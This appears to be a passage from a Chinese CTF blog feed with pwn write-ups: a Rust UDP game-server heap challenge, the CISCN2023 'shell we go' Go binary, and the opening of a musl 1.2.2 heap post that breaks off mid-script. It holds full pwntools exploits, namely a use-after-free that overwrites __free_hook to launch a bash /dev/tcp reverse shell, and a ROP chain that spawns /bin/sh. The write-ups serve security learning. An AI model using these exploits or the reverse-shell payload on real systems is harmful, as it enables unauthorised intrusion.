title="part2"></a>part2</h4><p>接下来就是找到程序是怎样比较的字符串的，我当时是随便输入一段字符，然后使用gdb定位到<code>UdpSocket::send_to</code>函数，这时是所有的字符都判断失败的情况：</p><img src="/img/14/Screenshot 2023-06-27 221618.png" style="zoom: 50%;" /><p>接下来使用ida从定位到<code>UdpSocket::send_to</code>函数自下往上找判断分支的代码块：</p><img src="/img/14/Screenshot 2023-06-27 222735.png"><p>最后发现所有的判断分支的代码块都是如下格式，中间的那个函数估计就是判断字符串的，而字符串地址就是在rdx中，ecx就是字符串长度：</p><img src="/img/14/Screenshot 2023-06-27 223650.png"><p>进一步查看byte_E64F1地址中的内容就可以知道比较的字符串了</p><img src="/img/14/Screenshot 2023-06-27 224141.png" style="zoom: 50%;" /><p>​                                 </p><p>最后我发现其实只有再将上面定位到的伪代码段往下多翻几行就可以看到if后有个cmp字样的函数，很容易想到这个就是判断字符串的函数，不用上面那么麻烦（🧐）</p><img src= "/img/14/Screenshot 2023-06-27 224513.png"><p>​                              </p><p>最后可以得到比较的字符串为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">login <br>register <br>purchase <br>fight <br>draw_000001 <br>draw_011214 <br>show_infomation <br>Data_testing_console <br>write_signature<br></code></pre></td></tr></table></figure><p>​                                               </p><h4 id="part3"><a href="#part3" class="headerlink" title="part3"></a>part3</h4><p>知道输入什么命令，接下来就容易多了。</p><p>login命令的格式是给提示的，可以直接类比到register命令。</p><p>purchase是用得到的100 currency去买卡。</p><p>draw_000001和draw_011214去抽hero。</p><p>fight是去打怪升级，升到10级这个游戏就算是赢了。</p><p>Data_testing_console只有在fight完这个游戏后才能使用。</p><p>fight的游戏赢了之后并没有什么去执行漏洞代码块的奖励，接下来就只能去看看Data_testing_console了。</p><p>进入Data_testing_console命令，一开始就提示我们<code>Enter function name:</code>，查看<code>server_game::Data_testing_console</code>函数的伪代码，这里看伪代码也是只看<code>UdpSocket::recv_from</code>和<code>UdpSocket::send_to</code>函数附近的。发现在该函数中<code>UdpSocket::send_to</code>只调用过一次，发送接下来的字符串<code>Enter the command:</code>，使用gdb attach一下进程发现该过程是在<code>server_game::Memory_Debug_console</code>函数中（带server_game字段的函数都需要看看 😫）</p><img src="/img/14/Screenshot 2023-06-27 231805.png" style="zoom: 50%;" /><p>查看<code>server_game::Memory_Debug_console</code>函数伪代码发现有libc字段</p><img src="/img/14/Screenshot 2023-06-27 231914.png" style="zoom: 80%;" /><p>联想到function name输入read后发现直接传回了read函数libc地址</p><img src="/img/14/Screenshot 2023-06-27 234719.png"><p>剩下的输入命令就使用和part2一样的办法找到命令字段为data_push和quit</p><p>​                                                         </p><h4 id="part4"><a href="#part4" class="headerlink" title="part4"></a>part4</h4><p>输入quit就是退出没什么可说的，输入data_push后又会进入一个<code>server_game::data_push</code>函数，也是用前面的方法找到operation字段push和grow。输入不同的operation接着都会有一个vector number去用switch判断，最后输入一个value。</p><p>push和grow，它们switch的case中代码段大致相同。</p><p>就伪代码而言自己完全无法知道哪些函数是需要重点关注的，只能使用gdb一步一步去调试，调试的时候注意输入的value，如果是某函数调用的参数也是该value就仔细对比一下函数前后寄存器以及[寄存器]值的变化。</p><p>这里我调试push操作时输入的value为48（value尽量特殊一点，这样便于观察），最后定位到一个带push字段的函数</p><img src="/img/14/Screenshot 2023-06-28 001800.png" style="zoom:50%;" /><p>rdi中的值前后对比如下：</p><img src= "/img/14/Screenshot 2023-06-28 001855.png"><p>​                             </p><img src= "/img/14/Screenshot 2023-06-28 001912.png"><p>多调试几次后就可以知道push的操作就是将value保存到栈上，value不能大于0x100，value就是一个字节的ASCII码，前一个字段就是push数据的大小。</p><p>vector number就是可以让value保存到不同区域：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># vector number = 1时，在0x95a0 + rsp(server_game::data_push函数中的栈顶) </span><br><span class="hljs-comment"># vector number = 2时，在0x96b0 + rsp</span><br><span class="hljs-comment"># vector number = 3时，在0x97c0 + rsp</span><br><span class="hljs-comment"># 每个区域正好相差0x110</span><br></code></pre></td></tr></table></figure><p>​                                         </p><p>调试grow操作时，也是定位到一个带grow字段的函数：</p><img src="/img/14/Screenshot 2023-06-28 012725.png" style="zoom:50%;" /><p>同时该函数伪代码中的比较的数据字段意义如下：</p><img src="/img/14/Screenshot 2023-06-28 012544.png"><p>在最后有一个带heap字段的函数，它的作用与realloc函数几乎一样：</p><img src="/img/14/Screenshot 2023-06-28 012849.png"><p>​               </p><p>最后发现vector number的作用与push一样，除了vector number &#x3D; 2以外，别的vector number都只能使用一次。</p><p>当vector number &#x3D; 2，输入的value（大于0x100时就使用堆存数据）与先前的value一样时该堆块就会释放，但是指针未清零，并且依旧可以使用push传入数据，就是一个uaf。</p><p>​                           </p><h4 id="part5"><a href="#part5" class="headerlink" title="part5"></a>part5</h4><p>漏洞利用很简单，libc的地址是白给的，直接利用uaf来实现tcache attack去修改free_hook，最后反弹shell。</p><p>最初我的利用代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">size = <span class="hljs-number">0x1d0</span><br>grow(<span class="hljs-number">2</span>, size)<br>grow(<span class="hljs-number">2</span>, size)<br>send_payload(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span>)<br>grow(<span class="hljs-number">2</span>, size)<br>grow(<span class="hljs-number">3</span>, size)<br>send_payload(<span class="hljs-number">3</span>, p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] + libc_base))<br>grow(<span class="hljs-number">4</span>, size)<br>grow(<span class="hljs-number">5</span>, size)<br>send_payload(<span class="hljs-number">5</span>, p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] + libc_base))<br></code></pre></td></tr></table></figure><p>利用vector number &#x3D; 2时可以使用多次，形成double free后直接修改tcache next指针为free_hook，再利用grow申请到free_hook，最后push数据到free_hook。但是实际上这样向free_hook写入数据是直接报错的，当push完第一个字节到free_hook上后，接下来调用drop_in_place函数：</p><img src="/img/14/Screenshot 2023-06-27 164146.png"><p>最后有调用的free的功能，这时free_hook中仅有写入的一个字节，但依旧去调用free_hook中的错误地址：</p><img src="/img/14/Screenshot 2023-06-28 015131.png"><p>​                                                                                         </p><p>当时我就自闭了😭，之后我看<a href="https://blog.wm-team.cn/index.php/archives/38/#Brave+Knights+and+Rusty+Swords">W&amp;M的wp</a>后才知道push操作也能申请堆块，刚开始不使用grow，直接push，如果push的数据大于0x100也是会申请堆上的内存，改用push就可以解决上面的问题。</p><p>​                                     </p><p>最后完整的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = remote(<span class="hljs-string">&#x27;192.168.184.133&#x27;</span>,<span class="hljs-number">8080</span>, typ=<span class="hljs-string">&#x27;udp&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;server_game&#x27;</span>)<br>libc = elf.libc<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p.sendline(<span class="hljs-string">b&#x27;register a a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Registration successful! You have received 100 currency.&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;login a a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Welcome back&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;purchase 100&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Purchase successful! You have received 10 cards.&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;draw_000001&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;You have received a new character&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;draw_000001&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;You have received a new character&#x27;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    t = <span class="hljs-string">b&#x27;&#x27;</span><br>    p.sendline(<span class="hljs-string">b&#x27;fight&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;fight: \n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;flee\n&#x27;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p.sendline(<span class="hljs-string">b&#x27;attack&#x27;</span>)<br>        p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        t = p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        <span class="hljs-keyword">if</span> t != <span class="hljs-string">b&#x27;\n&#x27;</span>:<br>            <span class="hljs-keyword">break</span><br>        p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        t = p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Congratulations!&#x27;</span> <span class="hljs-keyword">in</span> t:<br>            <span class="hljs-keyword">break</span><br>        p.recvuntil(<span class="hljs-string">b&#x27;flee\n&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Congratulations!&#x27;</span> <span class="hljs-keyword">in</span> t:<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">grow</span>(<span class="hljs-params">num, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the operation:&#x27;</span>, <span class="hljs-string">b&#x27;grow&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the vector number:&#x27;</span>, <span class="hljs-built_in">str</span>(num).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the grow value:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">num, value</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the operation:&#x27;</span>, <span class="hljs-string">b&#x27;push&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the vector number:&#x27;</span>, <span class="hljs-built_in">str</span>(num).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;value:&#x27;</span>, <span class="hljs-built_in">str</span>(value).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload</span>(<span class="hljs-params">num, payload</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:<br>        push(num, i)<br><br>p.sendline(<span class="hljs-string">b&#x27;Data_testing_console&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter function name:&#x27;</span>, <span class="hljs-string">b&#x27;free&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>leak = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>libc_base = leak - libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>libc.address = libc_base<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter the command:&#x27;</span>, <span class="hljs-string">b&#x27;data_push&#x27;</span>)<br><br><br>size = <span class="hljs-number">0x200</span><br>grow(<span class="hljs-number">1</span>, size)<br>grow(<span class="hljs-number">2</span>, size)<br>grow(<span class="hljs-number">2</span>, size)<br>send_payload(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span>)<br>grow(<span class="hljs-number">2</span>, size)<br>grow(<span class="hljs-number">3</span>, size)<br>send_payload(<span class="hljs-number">3</span>, p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">0x58</span>))<br>grow(<span class="hljs-number">4</span>, size)<br><br><span class="hljs-comment">#pause()</span><br>payload = <span class="hljs-string">b&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x1d0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>send_payload(<span class="hljs-number">5</span>, payload)<br>grow(<span class="hljs-number">5</span>, size)<br><br><span class="hljs-comment"># push 1 0x95a0  </span><br><span class="hljs-comment"># push 2 0x96b0</span><br><span class="hljs-comment"># push 3 0x97c0</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2023 shell we go</title>
    <link href="/2023/05/30/CISCN2023-shell-we-go/"/>
    <url>/2023/05/30/CISCN2023-shell-we-go/</url>
    
    <content type="html"><![CDATA[<p>在国赛上遇到的一道go语言的题，自己也是第一次遇到，在此记录一下复现的过程。</p><p>​</p><p>由于go语言编译都是静态的，而且程序把所有的符号表都去掉了，对于逆向的难度大大提升，虽然可以通过输出的字符串快速找到主函数，但是对于一些go语言的库函数根本就无法判断，分析这些库函数只会浪费大量时间；这里使用一下<a href="https://github.com/renshareck/IDAGolangHelper_SupportGo1.20">IDAGolangHelper</a>，可以修复go的符号表。</p><p>进入程序后很快就想到输入常用的shell命令，但是输出只有“Cert Is A Must”，查找”Cert“字符串可以看到还有一个”Cert complete, you can explore more“，说明需要输入一些东西认证：</p><img src="/img/13/Screenshot 2023-05-30 172622.png" style="zoom:80%;" /><p>​</p><p>引用该字符串的函数为main_unk_func0b01，好像看不出什么东西：</p><img src="/img/13/Screenshot 2023-05-30 173651.png" style="zoom: 80%;" /><p>接着向上找引用main_unk_func0b01的函数，看到main_unk_func0b05函数，很快就发现伪代码中没有调用过main_unk_func0b01函数的痕迹：</p><img src="/img/13/Screenshot 2023-05-30 174350.png" style="zoom: 67%;" /><p>​</p><p>直接查看该函数的汇编，果然ida7.7的伪代码功能对go无法准确识别。函数中下面的块全是cmp，将一些奇怪的16进制数变成字符串（需要逆序看），可以清晰地看到基本上全是一个先比较字符串长度，再去比较字符内容的一个过程，shell中不同指令的实现是将该过程重复多次来判断指令的内容，进而跳转到相应的地方去实现不同指令的功能：</p><img src="/img/13/Screenshot 2023-05-30 184428.png" style="zoom: 50%;" /><p>在cmp时，数据全是在rax的地址获取的，也很容易看到一个规律：[rax + i]为字符串的地址，[rax + i * 8]为字符串的大小，rax寄存器之前一次改变是在调用strings_genSplit函数后，通过gdb调试发现该函数通过空格来分割字符串，rax保存字符串分割后的信息，rbx是分割的块数：</p><p>​        <img src="/img/13/Screenshot 2023-05-30 192441.png" style="zoom: 50%;" /></p><p>​<img src="/img/13/Screenshot 2023-05-30 192627.png" style="zoom:50%;" /></p><p>​</p><p>接下来很多东西都可以顺利看懂了，想进入main_unk_func0b0函数，分割的块数为3，第一个字符串为”cert”，第二个字符串为”nAcDsMicN”，第三个字符串进入main_unk_func0b0函数后再去进一步比较。接下来再进入main_unk_func0b0分析，看到crypto_rc4_NewCipher、encoding_base64__ptr_Encoding_EncodeToString这些库函数，直接去网上搜一下，这些函数就是cr4加密后再进行base64编码，，最后与”JLIX8pbSvYZu&#x2F;WaG”比较，通过这个网站就可以解密：<a href="https://www.lddgo.net/encrypt/rc4">https://www.lddgo.net/encrypt/rc4</a></p><img src="/img/13/Screenshot 2023-05-30 013458.png" style="zoom:50%;" /><p>​</p><p>输入”cert nAcDsMicN S33UAga1n@#!”后就能真正去使用这个shell，回过头去看main_unk_func0b05函数中比较的字符串，可以发现的指令有”ls”、”cd”、”cat”、”whoami”、”echo”、”exit”，其中只有”ls”和”cd”才能真正实现相应的功能，而cat匹配到flag时会输出一个假的flag(😦)，真正有用的是echo会进入main_unk_func0b04函数。</p><p>main_unk_func0b04函数中通过输入的字符串的大小（除空格）作为循环的大小，将其单个字节循环复制到栈中，这里是一个echo的栈溢出，main_unk_func0b04函数会先对每一个字符串块的大小进行检查，直接使用空格绕过即可：</p><img src="/img/13/Screenshot 2023-05-30 201147.png" style="zoom:50%;" /><p>而在临近rbp的部分存着复制过程中循环的大小与栈的相对基址，如果直接填充数据溢出的数据将其改变就会使复制数据失败，不能覆盖返回地址了，这里使用”+”这个字符可以不对让数据不复制到栈上，而循环的大小依然再增加：</p><img src="/img/13/Screenshot 2023-05-30 201330.png" style="zoom: 50%;" /><p>​</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>pop_rdi_ret = <span class="hljs-number">0x444fec</span><br>pop_rsi_ret = <span class="hljs-number">0x41e818</span><br>pop_rdx_ret = <span class="hljs-number">0x49e11d</span><br>pop_rax_ret = <span class="hljs-number">0x40d9e6</span><br>syscall_ret = <span class="hljs-number">0x4636e9</span><br>bss = <span class="hljs-number">0x5A2C88</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;$&#x27;</span>, <span class="hljs-string">b&#x27;cert nAcDsMicN S33UAga1n@#!&#x27;</span>)<br><br>payload = p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi_ret) + p64(bss) + p64(pop_rdx_ret) + p64(<span class="hljs-number">8</span>) + p64(pop_rax_ret) + p64(<span class="hljs-number">0</span>) + p64(syscall_ret)<br>payload += p64(pop_rdi_ret) + p64(bss) + p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rdx_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rax_ret) + p64(<span class="hljs-number">0x3b</span>) + p64(syscall_ret)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;#&#x27;</span>, <span class="hljs-string">b&#x27;echo &#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x200</span> - <span class="hljs-number">0x100</span> - <span class="hljs-number">0xd</span>) + <span class="hljs-string">b&#x27; &#x27;</span> + <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x110</span> + <span class="hljs-string">b&#x27;+&#x27;</span> * <span class="hljs-number">0x20</span> + payload)<br>p.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>musl 1.2.2的两道pwn题</title>
    <link href="/2023/04/04/musl-pwn/"/>
    <url>/2023/04/04/musl-pwn/</url>
    
    <content type="html"><![CDATA[<p>musl 1.2.2堆的内存管理与以前学的glibc完全不同，是将一块连续的内存划分为相同的大小的chunk（有点像slab），再去由group、meta、malloc_context这些结构体逐级去管理，推荐大家多看几遍0xRGz师傅的musl源码解析<a href="https://bbs.kanxue.com/thread-269533-1.htm#msg_header_h3_8">文章</a>，这里主要写的是自己在复现musl pwn题中所学到的一些细节。</p><p>​                                                     </p><h3 id="前置要点"><a href="#前置要点" class="headerlink" title="前置要点"></a>前置要点</h3><h4 id="分配策略"><a href="#分配策略" class="headerlink" title="分配策略"></a>分配策略</h4><p>需要记住的是<strong>刚释放的chunk不会被立刻使用</strong>：</p><ul><li>在同一的group中，如果avail_mask不为0，如果释放一个该group中的chunk，接下来申请chunk也只会优先申请那些被avail_mask标识的，而不会去使用刚释放的；</li><li>如果avail_mask 为0，就会去找meta-&gt;next所指向的meta，调用activate_group函数更新下一个meta的avail_mask，接着去使用下一个meta中的chunk，同时将下一个meta更新为链表头。</li></ul><p>​                                                                      </p><h4 id="dequeue"><a href="#dequeue" class="headerlink" title="dequeue"></a>dequeue</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">dequeue</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> meta **phead, <span class="hljs-keyword">struct</span> meta *m)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (m-&gt;next != m) &#123;<br>        m-&gt;prev-&gt;next = m-&gt;next;<br>        m-&gt;next-&gt;prev = m-&gt;prev;<br>        <span class="hljs-keyword">if</span> (*phead == m) *phead = m-&gt;next;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        *phead = <span class="hljs-number">0</span>;<br>    &#125;<br>    m-&gt;prev = m-&gt;next = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>dequeue</strong> 触发条件：</p><ul><li><p>avail_mask 表示只有一个chunk 被使用 ，freed_mask &#x3D; 0，而free刚好要free 一个chunk；</p></li><li><p>avail_mask &#x3D; 0, freed_mask表示只有1个 chunk没被释放，这时释放的chunk就是最后一个chunk；</p></li><li><p>avail_mask &#x3D; 0, freed_mask &#x3D; 0，且继续申请该大小的chunk，这时就会unlink此meta，使用新的meta分配。</p></li></ul><p>​                                                               </p><h4 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">queue</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> meta **phead, <span class="hljs-keyword">struct</span> meta *m)</span><br>&#123;<br>assert(!m-&gt;next);<br>assert(!m-&gt;prev);<br><span class="hljs-keyword">if</span> (*phead) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">meta</span> *<span class="hljs-title">head</span> =</span> *phead;<br>m-&gt;next = head;<br>m-&gt;prev = head-&gt;prev;<br>m-&gt;next-&gt;prev = m-&gt;prev-&gt;next = m;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>m-&gt;prev = m-&gt;next = m;<br>*phead = m;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>queue</strong> 触发条件：</p><p>avail_mask &#x3D; 0， freed_mask &#x3D; 0，释放其中的一个chunk（当然该meta已经是dequeue的）。</p><p>​                                                                          </p><h3 id="祥云杯2021-babymull"><a href="#祥云杯2021-babymull" class="headerlink" title="祥云杯2021 babymull"></a>祥云杯2021 babymull</h3><p>这里是直接参考的这篇<a href="https://mp.weixin.qq.com/s/UwrZVlQ_WJ5rO4InOErt1g">wp</a>。</p><p>最主要的就是通过后门函数去泄漏malloc_context的secret，修改chunk的offset，让其找到伪造的group，再通过伪造的group找到伪造的meta，queue伪造的meta，最后修改伪造的meta-&gt;mem地址，实现任意地址写。</p><p>​</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;babymull&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./babymull&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content, name = <span class="hljs-string">b&#x27;a&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Name:&#x27;</span>, name)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span 